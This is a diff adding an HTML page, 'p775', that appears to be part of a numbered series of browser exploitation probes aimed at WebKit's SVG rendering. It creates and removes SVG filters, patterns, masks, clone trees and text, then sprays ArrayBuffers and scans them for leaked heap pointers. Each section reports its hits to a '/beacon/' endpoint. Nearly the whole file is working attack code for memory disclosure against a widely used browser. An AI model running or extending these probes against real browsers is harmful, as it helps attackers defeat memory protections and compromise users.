@@ -1,0 +1,474 @@
+<!--
+  p775: SVG filter / graphics pipeline internal buffer residue oracle
+
+  SVG filters (feGaussianBlur, feColorMatrix, feConvolveMatrix, etc.)
+  are processed by WebCore's FilterEffect pipeline. Each filter primitive
+  allocates intermediate pixel buffers (ImageBuffer objects) for its
+  input and output. These buffers live in the graphics subsystem, not
+  the JS heap.
+
+  Key insight: when an SVG element with filters is removed from the DOM,
+  the filter pipeline's intermediate buffers are freed. The filter graph
+  itself (FilterEffectRenderer, SourceGraphic, SourceAlpha nodes) holds
+  C++ pointers connecting the pipeline stages. Creating complex filter
+  chains and then removing the elements exercises this allocator.
+
+  Additionally: SVG pattern/gradient fills allocate tiling/interpolation
+  buffers. SVG clipPath and mask elements create alpha channel buffers.
+  SVG use elements with deep symbol references exercise the clone tree
+  allocator.
+
+  SVG text with complex attributes (textLength, lengthAdjust, multiple
+  tspan with dx/dy) allocates per-glyph positioning data in WebCore's
+  text layout engine -- different from CSS text layout.
+
+  The SVG DOM is a parallel API to the HTML DOM. SVGAnimatedLength,
+  SVGAnimatedTransformList, SVGPointList etc. are C++ backed animated
+  value holders that persist between frames.
+
+  Attack angles:
+  A) Complex SVG filter chain create/render/remove then AB spray.
+  B) SVG pattern/gradient fill buffer churn.
+  C) SVG clipPath/mask alpha channel buffer residue.
+  D) SVG animated value (SVGAnimatedLength etc.) create/GC residue.
+  E) SVG use/symbol deep clone tree allocator.
+  F) SVG text layout per-glyph positioning data.
+
+  CRASH_CLASS: LOW (SVG rendering, no side effects)
+  prior art: p770 (ImageBitmap decode), p773 (CSS style residue)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p775</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+var NS='http://www.w3.org/2000/svg';
+
+window.onload=function(){
+b('p775-START');
+
+// === Section A: Complex SVG filter chain create/render/remove ===
+try{
+  b('A-svg-filter-chain');
+  var aHits=0;
+
+  for(var round=0;round<5;round++){
+    var svg=document.createElementNS(NS,'svg');
+    svg.setAttribute('width','200');
+    svg.setAttribute('height','200');
+
+    var defs=document.createElementNS(NS,'defs');
+    for(var fi=0;fi<10;fi++){
+      var filter=document.createElementNS(NS,'filter');
+      filter.setAttribute('id','f'+round+'_'+fi);
+      filter.setAttribute('filterUnits','userSpaceOnUse');
+      filter.setAttribute('x','0');filter.setAttribute('y','0');
+      filter.setAttribute('width','200');filter.setAttribute('height','200');
+
+      var blur=document.createElementNS(NS,'feGaussianBlur');
+      blur.setAttribute('in','SourceGraphic');
+      blur.setAttribute('stdDeviation',String(1+fi));
+      blur.setAttribute('result','blur'+fi);
+      filter.appendChild(blur);
+
+      var cm=document.createElementNS(NS,'feColorMatrix');
+      cm.setAttribute('in','blur'+fi);
+      cm.setAttribute('type','matrix');
+      cm.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 '+(0.5+fi*0.05)+' 0');
+      cm.setAttribute('result','color'+fi);
+      filter.appendChild(cm);
+
+      var offset=document.createElementNS(NS,'feOffset');
+      offset.setAttribute('in','color'+fi);
+      offset.setAttribute('dx',String(fi));
+      offset.setAttribute('dy',String(fi));
+      offset.setAttribute('result','offset'+fi);
+      filter.appendChild(offset);
+
+      var merge=document.createElementNS(NS,'feMerge');
+      var mn1=document.createElementNS(NS,'feMergeNode');
+      mn1.setAttribute('in','offset'+fi);
+      var mn2=document.createElementNS(NS,'feMergeNode');
+      mn2.setAttribute('in','SourceGraphic');
+      merge.appendChild(mn1);merge.appendChild(mn2);
+      filter.appendChild(merge);
+
+      defs.appendChild(filter);
+    }
+    svg.appendChild(defs);
+
+    for(var i=0;i<20;i++){
+      var rect=document.createElementNS(NS,'rect');
+      rect.setAttribute('x',String(i*8));
+      rect.setAttribute('y',String(i*8));
+      rect.setAttribute('width','40');
+      rect.setAttribute('height','40');
+      rect.setAttribute('fill','rgb('+(i*12)+','+(i*7)+','+(255-i*10)+')');
+      rect.setAttribute('filter','url(#f'+round+'_'+(i%10)+')');
+      svg.appendChild(rect);
+    }
+
+    document.body.appendChild(svg);
+    void svg.getBBox();
+
+    document.body.removeChild(svg);
+    svg=null;
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(128);}
+
+    var SIZES=[128,192,256,512];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(sz);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('A-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      aHits+=szHits;
+    }
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: SVG pattern/gradient fill buffer churn ===
+try{
+  b('B-pattern-gradient');
+  var bHits=0;
+
+  for(var round=0;round<5;round++){
+    var svg=document.createElementNS(NS,'svg');
+    svg.setAttribute('width','300');svg.setAttribute('height','300');
+    var defs=document.createElementNS(NS,'defs');
+
+    for(var i=0;i<20;i++){
+      var pat=document.createElementNS(NS,'pattern');
+      pat.setAttribute('id','pat'+round+'_'+i);
+      pat.setAttribute('patternUnits','userSpaceOnUse');
+      pat.setAttribute('width',String(10+i));pat.setAttribute('height',String(10+i));
+      var r1=document.createElementNS(NS,'rect');
+      r1.setAttribute('width','100%');r1.setAttribute('height','100%');
+      r1.setAttribute('fill','rgb('+(i*12)+','+((i*7)%256)+','+(200-i*8)+')');
+      pat.appendChild(r1);
+      var c1=document.createElementNS(NS,'circle');
+      c1.setAttribute('cx',String(5+i/2));c1.setAttribute('cy',String(5+i/2));
+      c1.setAttribute('r',String(2+i/4));
+      c1.setAttribute('fill','rgb('+((i*17)%256)+','+(i*3)+',100)');
+      pat.appendChild(c1);
+      defs.appendChild(pat);
+
+      var lg=document.createElementNS(NS,'linearGradient');
+      lg.setAttribute('id','lg'+round+'_'+i);
+      for(var s=0;s<5;s++){
+        var stop=document.createElementNS(NS,'stop');
+        stop.setAttribute('offset',(s*25)+'%');
+        stop.setAttribute('stop-color','rgb('+((s*50+i*10)%256)+','+((s*30+i*7)%256)+','+((s*70)%256)+')');
+        stop.setAttribute('stop-opacity',String(0.5+s*0.1));
+        lg.appendChild(stop);
+      }
+      defs.appendChild(lg);
+    }
+    svg.appendChild(defs);
+
+    for(var i=0;i<40;i++){
+      var rect=document.createElementNS(NS,'rect');
+      rect.setAttribute('x',String((i%10)*28));
+      rect.setAttribute('y',String(Math.floor(i/10)*70));
+      rect.setAttribute('width','25');rect.setAttribute('height','60');
+      rect.setAttribute('fill',i%2===0?'url(#pat'+round+'_'+(i%20)+')':'url(#lg'+round+'_'+(i%20)+')');
+      svg.appendChild(rect);
+    }
+
+    document.body.appendChild(svg);
+    void svg.getBBox();
+    document.body.removeChild(svg);
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(96);}
+
+    var szHits=0;
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(192);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=192;off+=8){
+        if(isPtr(dv,off)){
+          szHits++;
+          if(szHits<=3)b('B-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    bHits+=szHits;
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: SVG clipPath/mask alpha channel buffer ===
+try{
+  b('C-clip-mask');
+  var cHits=0;
+
+  for(var round=0;round<5;round++){
+    var svg=document.createElementNS(NS,'svg');
+    svg.setAttribute('width','200');svg.setAttribute('height','200');
+    var defs=document.createElementNS(NS,'defs');
+
+    for(var i=0;i<15;i++){
+      var clip=document.createElementNS(NS,'clipPath');
+      clip.setAttribute('id','cp'+round+'_'+i);
+      var circle=document.createElementNS(NS,'circle');
+      circle.setAttribute('cx',String(50+i*3));
+      circle.setAttribute('cy',String(50+i*2));
+      circle.setAttribute('r',String(20+i*2));
+      clip.appendChild(circle);
+      defs.appendChild(clip);
+
+      var mask=document.createElementNS(NS,'mask');
+      mask.setAttribute('id','mk'+round+'_'+i);
+      var mr=document.createElementNS(NS,'rect');
+      mr.setAttribute('width','100%');mr.setAttribute('height','100%');
+      mr.setAttribute('fill','white');
+      mask.appendChild(mr);
+      var mc=document.createElementNS(NS,'circle');
+      mc.setAttribute('cx',String(60+i*2));mc.setAttribute('cy',String(60+i));
+      mc.setAttribute('r',String(15+i));mc.setAttribute('fill','black');
+      mask.appendChild(mc);
+      defs.appendChild(mask);
+    }
+    svg.appendChild(defs);
+
+    for(var i=0;i<30;i++){
+      var rect=document.createElementNS(NS,'rect');
+      rect.setAttribute('x','0');rect.setAttribute('y','0');
+      rect.setAttribute('width','200');rect.setAttribute('height','200');
+      rect.setAttribute('fill','rgb('+(i*8)+','+(i*4)+','+(255-i*7)+')');
+      if(i%2===0){
+        rect.setAttribute('clip-path','url(#cp'+round+'_'+(i%15)+')');
+      }else{
+        rect.setAttribute('mask','url(#mk'+round+'_'+(i%15)+')');
+      }
+      svg.appendChild(rect);
+    }
+
+    document.body.appendChild(svg);
+    void svg.getBBox();
+    document.body.removeChild(svg);
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(128);}
+
+    var szHits=0;
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(256);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=256;off+=8){
+        if(isPtr(dv,off)){
+          szHits++;
+          if(szHits<=2)b('C-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    cHits+=szHits;
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: SVG animated values create/GC ===
+try{
+  b('D-animated-values');
+  var dHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var svg=document.createElementNS(NS,'svg');
+      svg.setAttribute('width','100');svg.setAttribute('height','100');
+      document.body.appendChild(svg);
+
+      var elements=[];
+      for(var i=0;i<100;i++){
+        var rect=document.createElementNS(NS,'rect');
+        rect.setAttribute('x',String(i));
+        rect.setAttribute('y',String(i));
+        rect.setAttribute('width',String(10+i));
+        rect.setAttribute('height',String(10+i));
+        rect.setAttribute('transform','rotate('+(i*3.6)+' 50 50) scale('+(1+i*0.01)+')');
+        svg.appendChild(rect);
+
+        var xVal=rect.x;
+        var yVal=rect.y;
+        var wVal=rect.width;
+        var hVal=rect.height;
+        elements.push({el:rect,x:xVal,y:yVal,w:wVal,h:hVal});
+      }
+
+      if(round===0){
+        var e0=elements[0];
+        b('D animatedLength baseVal='+e0.x.baseVal.value+' animVal='+e0.x.animVal.value);
+        b('D transform.baseVal.numberOfItems='+elements[0].el.transform.baseVal.numberOfItems);
+      }
+
+      document.body.removeChild(svg);
+      elements=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+    var SIZES=[48,64,96,128];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(sz);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('D-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      dHits+=szHits;
+    }
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: SVG use/symbol deep clone tree ===
+try{
+  b('E-use-symbol');
+  var eHits=0;
+
+  for(var round=0;round<5;round++){
+    var svg=document.createElementNS(NS,'svg');
+    svg.setAttribute('width','300');svg.setAttribute('height','300');
+    var defs=document.createElementNS(NS,'defs');
+
+    for(var i=0;i<10;i++){
+      var symbol=document.createElementNS(NS,'symbol');
+      symbol.setAttribute('id','sym'+round+'_'+i);
+      symbol.setAttribute('viewBox','0 0 50 50');
+      for(var j=0;j<8;j++){
+        var c=document.createElementNS(NS,'circle');
+        c.setAttribute('cx',String(10+j*4));
+        c.setAttribute('cy',String(25));
+        c.setAttribute('r',String(3+j));
+        c.setAttribute('fill','rgb('+((j*30+i*20)%256)+','+(j*40%256)+','+(200-j*20)+')');
+        symbol.appendChild(c);
+      }
+      defs.appendChild(symbol);
+    }
+    svg.appendChild(defs);
+
+    for(var i=0;i<50;i++){
+      var use=document.createElementNS(NS,'use');
+      use.setAttributeNS('http://www.w3.org/1999/xlink','href','#sym'+round+'_'+(i%10));
+      use.setAttribute('x',String((i%10)*28));
+      use.setAttribute('y',String(Math.floor(i/10)*55));
+      use.setAttribute('width','25');use.setAttribute('height','50');
+      svg.appendChild(use);
+    }
+
+    document.body.appendChild(svg);
+    void svg.getBBox();
+    document.body.removeChild(svg);
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(96);}
+
+    var szHits=0;
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(128);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=128;off+=8){
+        if(isPtr(dv,off)){
+          szHits++;
+          if(szHits<=2)b('E-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    eHits+=szHits;
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: SVG text layout per-glyph positioning ===
+try{
+  b('F-svg-text');
+  var fHits=0;
+
+  for(var round=0;round<5;round++){
+    var svg=document.createElementNS(NS,'svg');
+    svg.setAttribute('width','400');svg.setAttribute('height','300');
+
+    for(var i=0;i<30;i++){
+      var text=document.createElementNS(NS,'text');
+      text.setAttribute('x',String(10+i*2));
+      text.setAttribute('y',String(20+i*8));
+      text.setAttribute('font-size',String(10+i%10));
+      text.setAttribute('textLength',String(50+i*5));
+      text.setAttribute('lengthAdjust','spacing');
+
+      for(var j=0;j<5;j++){
+        var tspan=document.createElementNS(NS,'tspan');
+        tspan.setAttribute('dx',String(j*2));
+        tspan.setAttribute('dy',String(j%2===0?0:1));
+        tspan.setAttribute('rotate',String(j*5));
+        tspan.textContent='Word'+j;
+        text.appendChild(tspan);
+      }
+      svg.appendChild(text);
+    }
+
+    document.body.appendChild(svg);
+    void svg.getBBox();
+
+    if(round===0){
+      var firstText=svg.querySelector('text');
+      try{
+        var len=firstText.getComputedTextLength();
+        b('F computedTextLength='+len.toFixed(2));
+        var numChars=firstText.getNumberOfChars();
+        b('F numberOfChars='+numChars);
+      }catch(e){
+        b('F text_api_err='+e.message);
+      }
+    }
+
+    document.body.removeChild(svg);
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+    var SIZES=[64,96,128,192];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(sz);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('F-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      fHits+=szHits;
+    }
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p775-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
